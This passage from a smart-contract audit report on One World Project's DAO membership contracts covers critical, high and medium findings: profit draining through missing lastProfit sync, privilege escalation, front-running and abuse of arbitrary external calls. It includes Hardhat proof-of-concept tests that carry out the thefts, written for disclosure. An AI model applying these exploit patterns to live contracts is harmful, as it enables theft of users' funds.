**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[Gio](https://twitter.com/giovannidisiena)

**Assisting Auditors**



---

# Findings
## Critical Risk


### `MembershipERC1155` profit tokens can be drained due to missing `lastProfit` synchronization when minting and claiming profit

**Description:** When [`MembershipERC1155:claimProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L138-L147) is called by a DAO member, the [`lastProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L184) mapping is updated to keep track of their claimed rewards; however, this state is not synchronized when minting/burning membership tokens or when transferring membership tokens to a new account.

Hence, when minting or transferring, a new user will be considered eligible for a share of previous profit from before they were a DAO member. Aside from the obvious case where a new DAO member claims profits at the expense of other existing members, this can be weaponized by recycling the same membership token between fresh accounts and claiming until the profit token balance of the `MembershipERC1155Contract` has been drained.

**Impact:** DAO members can claim profits to which they should not be entitled and malicious users can drain the `MembershipERC1155` contract of all profit tokens (including those from membership fees if paid in the same currency).

**Proof of Concept:** The following tests can be added to `describe("Profit Sharing")` in `MembershipERC1155.test.ts`:
```javascript
it("lets users steal steal account balance by transferring tokens and claiming profit", async function () {
    await membershipERC1155.connect(deployer).mint(user.address, 1, 100);
    await membershipERC1155.connect(deployer).mint(anotherUser.address, 1, 100);
    await testERC20.mint(nonAdmin.address, ethers.utils.parseEther("20"));
    await testERC20.connect(nonAdmin).approve(membershipERC1155.address, ethers.utils.parseEther("20"));
    await membershipERC1155.connect(nonAdmin).sendProfit(testERC20.address, ethers.utils.parseEther("2"));
    const userProfit = await membershipERC1155.profitOf(user.address, testERC20.address);
    expect(userProfit).to.be.equal(ethers.utils.parseEther("1"));

    const beforeBalance = await testERC20.balanceOf(user.address);
    const initialContractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // user claims profit
    await membershipERC1155.connect(user).claimProfit(testERC20.address);

    const afterBalance = await testERC20.balanceOf(user.address);
    const contractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // users balance increased
    expect(afterBalance.sub(beforeBalance)).to.equal(userProfit);
    expect(contractBalance).to.equal(initialContractBalance.sub(userProfit));

    // user creates a second account and transfers their tokens to it
    const userSecondAccount = (await ethers.getSigners())[4];
    await membershipERC1155.connect(user).safeTransferFrom(user.address, userSecondAccount.address, 1, 100, '0x');
    const newProfit = await membershipERC1155.profitOf(userSecondAccount.address, testERC20.address);
    expect(newProfit).to.be.equal(userProfit);

    // second account can claim profit
    const newBeforeBalance = await testERC20.balanceOf(userSecondAccount.address);
    await membershipERC1155.connect(userSecondAccount).claimProfit(testERC20.address);
    const newAfterBalance = await testERC20.balanceOf(userSecondAccount.address);
    expect(newAfterBalance.sub(newBeforeBalance)).to.equal(newProfit);

    // contract balance has decreased with twice the profit
    const contractBalanceAfter = await testERC20.balanceOf(membershipERC1155.address);
    expect(contractBalanceAfter).to.equal(initialContractBalance.sub(userProfit.mul(2)));
    expect(contractBalanceAfter).to.equal(0);

    // no profit left for other users
    const anotherUserProfit = await membershipERC1155.profitOf(anotherUser.address, testERC20.address);
    expect(anotherUserProfit).to.be.equal(ethers.utils.parseEther("1"));
    await expect(membershipERC1155.connect(anotherUser).claimProfit(testERC20.address)).to.be.revertedWith("ERC20: transfer amount exceeds balance");
});

it("lets users steal steal account balance by minting after profit is sent", async function () {
    await membershipERC1155.connect(deployer).mint(user.address, 1, 100);
    await membershipERC1155.connect(deployer).mint(anotherUser.address, 1, 100);
    await testERC20.mint(nonAdmin.address, ethers.utils.parseEther("20"));
    await testERC20.connect(nonAdmin).approve(membershipERC1155.address, ethers.utils.parseEther("20"));
    await membershipERC1155.connect(nonAdmin).sendProfit(testERC20.address, ethers.utils.parseEther("2"));
    const userProfit = await membershipERC1155.profitOf(user.address, testERC20.address);
    expect(userProfit).to.be.equal(ethers.utils.parseEther("1"));

    const beforeBalance = await testERC20.balanceOf(user.address);
    const initialContractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // user claims profit
    await membershipERC1155.connect(user).claimProfit(testERC20.address);

    const afterBalance = await testERC20.balanceOf(user.address);
    const contractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // users balance increased
    expect(afterBalance.sub(beforeBalance)).to.equal(userProfit);
    expect(contractBalance).to.equal(initialContractBalance.sub(userProfit));

    // new user mints a token after profit and can claim first users profit
    const newUser = (await ethers.getSigners())[4];
    await membershipERC1155.connect(deployer).mint(newUser.address, 1, 100);
    const newProfit = await membershipERC1155.profitOf(newUser.address, testERC20.address);
    expect(newProfit).to.be.equal(ethers.utils.parseEther("1"));

    // new user can claim profit
    const newBeforeBalance = await testERC20.balanceOf(newUser.address);
    await membershipERC1155.connect(newUser).claimProfit(testERC20.address);
    const newAfterBalance = await testERC20.balanceOf(newUser.address);
    expect(newAfterBalance.sub(newBeforeBalance)).to.equal(newProfit);

    // contract balance has decreased with twice the profit
    const contractBalanceAfter = await testERC20.balanceOf(membershipERC1155.address);
    expect(contractBalanceAfter).to.equal(initialContractBalance.sub(userProfit.mul(2)));
    expect(contractBalanceAfter).to.equal(0);

    // no profit left for first users
    const anotherUserProfit = await membershipERC1155.profitOf(anotherUser.address, testERC20.address);
    expect(anotherUserProfit).to.be.equal(ethers.utils.parseEther("1"));
    await expect(membershipERC1155.connect(anotherUser).claimProfit(testERC20.address)).to.be.revertedWith("ERC20: transfer amount exceeds balance");
});
```

**Recommended Mitigation:** Consider overriding `ERC1155::_beforeTokenTransfer` to take a snapshot of the profit state whenever relevant actions are performed.

**One World Project:** Updated code structure, removed redundant code. Updated rewards on token transfers in [`a3980c1`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a3980c17217a0b65ecbd28eb078d4d94b4bd5b80) and [`a836386`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a836386bd48691078435d10df5671e3c25f23719)

**Cyfrin:** Verified. Rewards are now updated in the `ERC1155Upgradeable::_update` which will apply to all movement of tokens.


### DAO creator can inflate their privileges to mint/burn membership tokens, steal profits, and abuse approvals to `MembershipERC1155`

**Description:** During the [creation of a new DAO](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L66-L70), the `MembershipFactory` contract is [granted](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L49) the `OWP_FACTORY_ROLE` which has special privileges to [mint](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L52-L59)/[burn](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L61-L67) tokens and execute any arbitrary call via [`MembershipERC1155::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L202-L210). Additionally, the calling account is [granted](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L48) the `DEFAULT_ADMIN_ROLE`; however, as [documented](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/access/AccessControl.sol#L40-L48), this bestows the power to manage all other roles as well.

This means that the creator of a given DAO can grant themselves the `OWP_FACTORY_ROLE` by calling `AccessControl::grantRole` and has a number of implications:
- Profit tokens can be stolen from callers of [`MembershipERC1155:sendProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L189-L200), either by front-running and/or abusing dangling approvals.
- The DAO creator has unilateral control of the DAO and its membership tokens, so can mint/burn to/from any address.
- Profit can be stolen from the DAO by front-running a call to `MembershipERC1155::sendProfit` with a call to [`MembershipERC1155::burnBatchMultiple`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L85-L99) to ensure that [this conditional block](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L198-L200) is executed by causing the total supply of membership tokens to become zero. Alternatively, they can wait for the call to be executed and transfer the tokens directly using the arbitrary external call.

```solidity
if (_totalSupply > 0) {
    totalProfit[currency] += (amount * ACCURACY) / _totalSupply;
    IERC20(currency).safeTransferFrom(msg.sender, address(this), amount);
    emit Profit(amount);
} else {
    IERC20(currency).safeTransferFrom(msg.sender, creator, amount); // Redirect profit to creator if no supply
}
```

It is also prescient to note that this issue exists in isolation as a centralization risk of the One World Project owner itself, as detailed in a separate finding, who controls the `MembershipFactory` contract and thus all DAOs via [`MembershipFactory::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163).

**Impact:** The creator of a DAO can escalate their privileges to have unilateral control and steal profits from its members, as well as abusing any profit token approvals to the contract. All of the above is also possible for the One World Project owner, who has control of the factory and thus all DAOs created by it.

**Proof of Concept:** The following test can be added to `describe("ERC1155 and AccessControl Interface Support")` in `MembershipERC1155.test.ts`:
```javascript
it("can give OWP_FACTORY_ROLE to an address and abuse priviliges", async function () {
    const [factory, creator, user] = await ethers.getSigners();
    const membership = await MembershipERC1155.connect(factory).deploy();
    await membership.deployed();
    await membership.initialize("TestToken", "TST", tokenURI, creator.address);

    await membership.connect(creator).grantRole(await membership.OWP_FACTORY_ROLE(), creator.address);
    expect(await membership.hasRole(await membership.OWP_FACTORY_ROLE(), creator.address)).to.be.true;

    // creator can mint and burn at will
    await membership.connect(creator).mint(user.address, 1, 100);
    await membership.connect(creator).burn(user.address, 1, 50);

    await testERC20.mint(user.address, ethers.utils.parseEther("1"));
    await testERC20.connect(user).approve(membership.address, ethers.utils.parseEther("1"));

    const creatorBalanceBefore = await testERC20.balanceOf(creator.address);

    // creator can abuse approvals
    const data = testERC20.interface.encodeFunctionData("transferFrom", [user.address, creator.address, ethers.utils.parseEther("1")]);
    await membership.connect(creator).callExternalContract(testERC20.address, data);

    const creatorBalanceAfter = await testERC20.balanceOf(creator.address);
    expect(creatorBalanceAfter.sub(creatorBalanceBefore)).to.equal(ethers.utils.parseEther("1"));
});
```

**Recommended Mitigation:** Implement more fine-grained access controls for the DAO creator instead of granting the `DEFAULT_ADMIN_ROLE`.

**One World Project:** Given a separate role to the creator in [`a6b9d82`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a6b9d82796c2d87a3924e8e80c3732474bf22506).

**Cyfrin:** Verified. `creator` now has a separate role `DAO_CREATOR ` that can only change URI.

\clearpage
## High Risk


### `MembershipERC1155::sendProfit` can be front-run by calls to `MembershipFactory::joinDAO` to steal profit from existing DAO members

**Description:** Profit is distributed to DAO members following a call to [`MembershipERC1155::sendProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L189-L201) which increases the profit per share tracked in [`totalProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L195). Due to the absence of any sort of profit-sharing delay upon joining the DAO, another user with sufficient financial motivation could see this transaction and buy up a large stake in the DAO before it is executed. This would entitle them to a claim on the newly-added profits at the expense of existing DAO members.

**Impact:** Calls to `MembershipERC1155::sendProfit` can be front-run, unfairly decreasing the profit paid out to existing DAO members.

**Proof of Concept:** The following test can be added to  `describe("Join DAO")` in `MembershipFactory.test.ts`:
```javascript
it("lets users front-run profit distribution", async function () {
  const tierIndex = 0;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1"));
  await testERC20.connect(addr1).approve(membershipFactory.address, TierConfig[tierIndex].price);
  await testERC20.mint(addr2.address, ethers.utils.parseEther("1"));
  await testERC20.connect(addr2).approve(membershipFactory.address, ethers.utils.parseEther("1"));
  await testERC20.mint(owner.address, ethers.utils.parseEther("1"));
  await testERC20.connect(owner).approve(membershipERC1155.address, ethers.utils.parseEther("1"));
  // user1 joins
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, tierIndex);

  // time passes

  // user2 sees a pending sendProfit tx and front-runs it by buying a lot of membership tokens
  // this can be done with a deployed contract
  for(let i = 0; i < 9; i++) {
    await membershipFactory.connect(addr2).joinDAO(membershipERC1155.address, tierIndex);
  }

  // send profit tx is executed
  await membershipERC1155.sendProfit(testERC20.address, ethers.utils.parseEther("1"));

  const addr1Profit = await membershipERC1155.profitOf(addr1.address, testERC20.address);
  const addr2Profit = await membershipERC1155.profitOf(addr2.address, testERC20.address);

  // user2 has gotten 9x the profit of user1
  expect(addr1Profit).to.equal(ethers.utils.parseEther("0.1"));
  expect(addr2Profit).to.equal(ethers.utils.parseEther("0.9"));
});
```

**Recommended Mitigation:** Consider implementing a membership delay, after which profit sharing is activated.

**One World Project:** Membership must be purchased, and if a user wishes to acquire a significant number of shares to potentially front-run the sendProfit function, they would need to spend a much larger amount than the profit they would gain.

**Cyfrin:** Acknowledged. However, since the One World Project neither controls the distribution of profits nor the timing of user participation, it cannot enforce limitations that would prevent a scenario where the financial incentives exceed the cost of membership entry. In cases where the profit distribution is significant, the situation could become financially viable for participants, even if unintended. As the protocol does not have control over these variables, it cannot prevent a DAO from inadvertently creating this scenario. Therefore, we recommend that the One World Project clearly communicate this potential risk in its documentation during the onboarding of new DAOs.


### One World Project has unilateral control over all DAOs, allowing the owner to update tier configurations, mint/burn membership tokens, steal profits, and abuse token approvals to `MembershipFactory` and `MembershipERC1155` proxy contracts

**Description:** When the `MembershipFactory` contract is deployed, the `EXTERNAL_CALLER` role is granted to the caller. This allows the One World Project to update the tiers configurations for a specific DAO via [`MembershipFactory::updateDAOMembership`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L90-L117) and execute any arbitrary call via [`MembershipFactory::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163). Additionally, during the [creation of a new DAO](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L66-L70), the `MembershipFactory` contract is [granted](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L49) the `OWP_FACTORY_ROLE` which has special privileges to [mint](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L52-L59)/[burn](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L61-L67) tokens and execute any arbitrary call via [`MembershipERC1155::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L202-L210).

While unilateral control over DAO tier configurations alone is prescient to note, the chaining of `MembershipFactory::callExternalContract` and `MembershipERC1155::callExternalContract` calls is incredibly dangerous without any restrictions on the target function selectors and contracts to be called. As a consequence, similar to the other privilege escalation vulnerability, the One World Project owner has the ability to arbitrarily mint/burn membership tokens for all DAOs, steal profits, and abuse approvals to `MembershipERC1155` proxy contracts. Furthermore, `MembershipFactory::callExternalContract` can be used to abuse approvals given to this contract directly, by front-running or otherwise – if a user sets the maximum `uint256` allowance on joining a DAO, the One World Project owner could drain their entire token balance for the given currency.

**Impact:** The One World Project owner has unilateral control of the `MembershipFactory` contract and thus all DAOs created by it, meaning profits can be stolen from its members and profit token approvals to the proxy contracts abused. The One World Project owner could also drain the balances of any tokens with dangling approvals to the `MembershipFactory` contract. This is especially problematic if the owner address becomes compromised in any way.

**Proof of Concept:** The following test can be added to `describe("Call External Contract")` in `MembershipFactory.test.ts`:
```javascript
it("allows admin to have unilateral power", async function() {
  await testERC20.mint(addr1.address, ethers.utils.parseEther("2"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1"));

  await currencyManager.addCurrency(testERC20.address);  // Assume addCurrency function exists in CurrencyManager
  const tx = await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);
  const receipt = await tx.wait();
  const event = receipt.events.find((event:any) => event.event === "MembershipDAONFTCreated");
  const nftAddress = event.args[1];
  const membershipERC1155 = await MembershipERC1155.attach(nftAddress);

  let ownerBalanceBefore = await testERC20.balanceOf(owner.address);

  // admin can steal approvals made to factory
  const transferData = testERC20.interface.encodeFunctionData("transferFrom", [addr1.address, owner.address, ethers.utils.parseEther("1")]);
  await membershipFactory.callExternalContract(testERC20.address, transferData);

  let ownerBalanceAfter = await testERC20.balanceOf(owner.address);
  expect(ownerBalanceAfter.sub(ownerBalanceBefore)).to.equal(ethers.utils.parseEther("1"));

  // admin can mint/burn any DAO membership tokens
  const mintData = membershipERC1155.interface.encodeFunctionData("mint", [owner.address, 1, 100]);
  await membershipFactory.callExternalContract(nftAddress, mintData);

  let ownerBalanceERC1155 = await membershipERC1155.balanceOf(owner.address, 1);
  expect(ownerBalanceERC1155).to.equal(100);

  const burnData = membershipERC1155.interface.encodeFunctionData("burn", [owner.address, 1, 50]);
  await membershipFactory.callExternalContract(nftAddress, burnData);

  ownerBalanceERC1155 = await membershipERC1155.balanceOf(owner.address, 1);
  expect(ownerBalanceERC1155).to.equal(50);

  // admin can abuse approvals to any membership tokens as well
  await testERC20.connect(addr1).approve(membershipERC1155.address, ethers.utils.parseEther("1"));

  ownerBalanceBefore = await testERC20.balanceOf(owner.address);

  const data = membershipERC1155.interface.encodeFunctionData("callExternalContract", [testERC20.address, transferData]);
  await membershipFactory.callExternalContract(membershipERC1155.address, data);

  ownerBalanceAfter = await testERC20.balanceOf(owner.address);
  expect(ownerBalanceAfter.sub(ownerBalanceBefore)).to.equal(ethers.utils.parseEther("1"));
});
```

**Recommended Mitigation:** Implement restrictions on the target contracts and function selectors to be invoked by the arbitrary external calls to prevent abuse of the `MembershipFactory` contract ownership.

**One World Project:** The `EXTERNAL_CALLER` wallet is securely stored in AWS Secrets Manager in the backend, with no access granted to any individual. This wallet is necessary to execute on-chain transactions for off-chain processes. Further the executable functions are not defined to specific function-signatures, because in future this contract may be required to interact with contracts to distribute funds to projects or perform other tasks through the DAO, by executing through off-chain approvals

**Cyfrin:** Acknowledged. While AWS Secrets Manager adds security, private key or API key leaks remain a risk.

\clearpage
## Medium Risk


### DAO name can be stolen by front-running calls to `MembershipFactory::createNewDAOMembership`

**Description:** When `MembershipFactory::createNewDAOMembership` is called, the newly created `MembershipERC1155` instance it is [associated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L61) with a name, `ensname`:

```solidity
require(getENSAddress[daoConfig.ensname] == address(0), "DAO already exist.");
```

However, this call can be front-run by a malicious user who sees that another creator is setting up a One World Project membership token and "steals" their name by registering the same name before them.

**Impact:** Anyone can front-run the creation of a DAO membership. This could be used for creating honey pots or just to grief the DAO creator.

**Recommended Mitigation:** Consider validating that the DAO creator is associated with the corresponding ENS name. Alternatively, allow the name to be any string and use a concatenation of the creator and name as a key.

**One World Project:** The DAO name is not necessarily an ENS name, and can be any string. If any name is not available the dao creator is made aware in the frontend website beforehand, and they are free to choose any other name or variation of that name. The name is kept in string format to help the dao creators identify/remember their daos easily without have to remember any ids

If someone is able to create a DAO with that name before you then they are allowed to, and the user would have to choose a different name or variation for their DAO. It is solely up to the DAO creators to decide the DAO names however they like.

**Cyfrin:** Acknowledged.


### DAO membership fees cannot be retrieved by the creator

**Description:** The DAO membership fee taken from users who invoke [`MembershipFactory::joinDAO`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L120-L133) is split between the One World Project and the DAO creator, being sent to the One World Project wallet and DAO `MembershipERC1155` instance respectively:

```solidity
uint256 tierPrice = daos[daoMembershipAddress].tiers[tierIndex].price;
uint256 platformFees = (20 * tierPrice) / 100;
daos[daoMembershipAddress].tiers[tierIndex].minted += 1;
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, owpWallet, platformFees);
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, daoMembershipAddress, tierPrice - platformFees);
```

However, the fees [sent](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L130) to the `daoMembershipAddress` are not accessible to the DAO creator as there is no method for direct retrieval. The only way these funds can be retrieved and sent to the creator is if the `MembershipFactory::EXTERNAL_CALLER` role invokes [`MembershipERC1155::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L202-L210) via [`MembershipFactory::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163), allowing arbitrary external calls to be executed.

**Impact:** The DAO creator has no direct method for retrieving the membership fees paid to their `MembershipERC1155` instance, ignoring rescue initiated by the `EXTERNAL_CALLER` role.

**Proof of Concept:** The following test can be added to `describe("Create New DAO Membership")` in `MembershipFactory.test.ts`:
```javascript
it("only allows owner to recover dao membership fees", async function () {
  await currencyManager.addCurrency(testERC20.address);
  const creator = addr1;

  await membershipFactory.connect(creator).createNewDAOMembership(DAOConfig, TierConfig);

  const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
  const membershipERC1155 = await MembershipERC1155.attach(ensAddress);

  await testERC20.mint(addr2.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr2).approve(membershipFactory.address, ethers.utils.parseEther("20"));
  await expect(membershipFactory.connect(addr2).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;

  // fees are in the membership token but cannot be retrieved by the creator
  const daoMembershipBalance = await testERC20.balanceOf(membershipERC1155.address);
  expect(daoMembershipBalance).to.equal(160); // minus protocol fee

  const creatorBalanceBefore = await testERC20.balanceOf(creator.address);

  // only admin can recover them
  const transferData = testERC20.interface.encodeFunctionData("transfer", [creator.address, 160]);
  const data = membershipERC1155.interface.encodeFunctionData("callExternalContract", [testERC20.address, transferData]);
  await membershipFactory.callExternalContract(membershipERC1155.address, data);

  const creatorBalanceAfter = await testERC20.balanceOf(creator.address);
  expect(creatorBalanceAfter.sub(creatorBalanceBefore)).to.equal(160);
});
```

**Recommended Mitigation:** Consider adding a method for the creator of the DAO to retrieve the membership fees paid by users upon joining the DAO.

**One World Project:** The DAO creator is deliberately, by design, not allowed to access the DAO funds. They have to be accessed through the `callExternalContract` which can only be called by the `EXTERNAL_CONTRACT` which does its own verifications in the backend.

**Cyfrin:** Acknowledged. This dependency introduces additional risks, and we recommend ensuring the off-chain service meets stringent security standards.


### Meta transactions do not work with most of the calls in `MembershipFactory`

**Description:** `MembershipFactory` uses a custom meta transactions implementation by inheriting `NativeMetaTransaction` which allow a relayer to pay the transaction fees on behalf of a user. This is achieved by following the same standard as ERC2771, where the user signs a transaction that is forwarded by a relayer and executed with the signing user's address appended to the `msg.data`.

Therefore, `msg.sender` cannot be used to retrieve the actual sender of a transaction as this will be the relayer in the case of [`NativeMetaTransaction::executeMetaTransaction`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L33) being called. As already implemented [here](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L165-L185), the solution is to utilize a `_msgSender()` function that retrieves the signing user from the last 20 bytes of the `msg.data` in these cases.

For this reason, the following functions in `MembershipFactory` are problematic:
* `MembershipFactory::createNewDAOMembership` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L69), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L84)].
* `MembershipFactory::joinDAO` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L129), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L130), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L131), [4](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L132)].
* `MembershipFactory::upgradeTier` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L141), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L142), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L143)].

**Impact:** None of the above calls will work properly in combination when originated via `NativeMetaTransaction::executeMetaTransaction`, with `MembershipFactory::createNewDAOMembership` being the most problematic as it will create the DAO membership token with the `MembershipFactory` contract address as the `creator`. `MembershipFactory::joinDAO` and `MembershipFactory::upgradeTier` will most likely just revert as they require the `msg.sender` (`MembershipFactory`) to hold either `MembershipERC1155` tokens or payment `ERC20` tokens, which it shouldn't.

**Proof of Concept:** Test that can be added in `MembershipFactory.test.ts`:
```javascript
describe("Native meta transaction", function () {
  it("Meta transactions causes creation to use the wrong owner", async function () {
    await currencyManager.addCurrency(testERC20.address);

    const { chainId } = await ethers.provider.getNetwork();
    const salt = ethers.utils.hexZeroPad(ethers.utils.hexlify(chainId), 32)

    const domain = {
      name: 'OWP',
      version: '1',
      salt: salt,
      verifyingContract: membershipFactory.address,
    };
    const types = {
      MetaTransaction: [
        { name: 'nonce', type: 'uint256' },
        { name: 'from', type: 'address' },
        { name: 'functionSignature', type: 'bytes' },
      ],
    };
    const nonce = await membershipFactory.getNonce(addr1.address);
    const metaTransaction = {
      nonce,
      from: addr1.address,
      functionSignature: membershipFactory.interface.encodeFunctionData('createNewDAOMembership', [DAOConfig, TierConfig]),
    };
    const signature = await addr1._signTypedData(domain, types, metaTransaction);
    const {v,r,s} = ethers.utils.splitSignature(signature);

    const tx = await membershipFactory.executeMetaTransaction(metaTransaction.from, metaTransaction.functionSignature, r, s, v);
    const receipt = await tx.wait();
    const event = receipt.events.find((event:any) => event.event === "MembershipDAONFTCreated");
    const nftAddress = event.args[1];
    const creator = await MembershipERC1155.attach(nftAddress).creator();

    // creator becomes the membership factory not addr1
    expect(creator).to.equal(membershipFactory.address);
  });
});
```

**Recommended Mitigation:** Consider using `_msgSender()` instead of `msg.sender` in the above mentioned functions.

**One World Project:** The MetaTransaction’s only intended use is to call the callExternalContract function.The current implementation is that the `EXTERNAL_CALLER` signs the transaction in backend and then sends the signed object to the user and user sends it to the contract by the `executeMetaTransaction()` function. This way OWP Platform does not have to pay gas fees for any admin `transaction._msgSender()` still added at commit hash [`83ba905`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/83ba905f581be57a56d521deff6d75e0837b2237).

**Cyfrin:** Verified. `_msgSender()` is now used throughout the contract.


### Tier restrictions for `SPONSORED` DAOs can be bypassed by calling `MembershipFactory::upgradeTier`

